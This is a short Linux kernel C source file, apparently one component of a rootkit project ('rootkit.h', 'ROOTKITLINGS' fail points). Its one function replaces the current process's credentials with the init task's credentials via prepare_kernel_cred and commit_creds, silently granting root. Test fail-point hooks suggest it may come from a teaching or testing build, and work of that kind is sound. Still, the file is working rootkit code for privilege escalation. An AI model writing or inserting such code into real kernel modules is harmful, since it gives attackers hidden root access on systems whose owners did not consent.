// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/sched.h>

#include "rootkit.h"

int rk_credentials_replace_current(void)
{
	struct cred *replacement;

	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_CREDENTIAL_PREPARE)
		return -ENOMEM;

	replacement = prepare_kernel_cred(&init_task);
	if (!replacement)
		return -ENOMEM;

	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_CREDENTIAL_CANCEL) {
		abort_creds(replacement);
		return -ECANCELED;
	}

	return commit_creds(replacement);
}
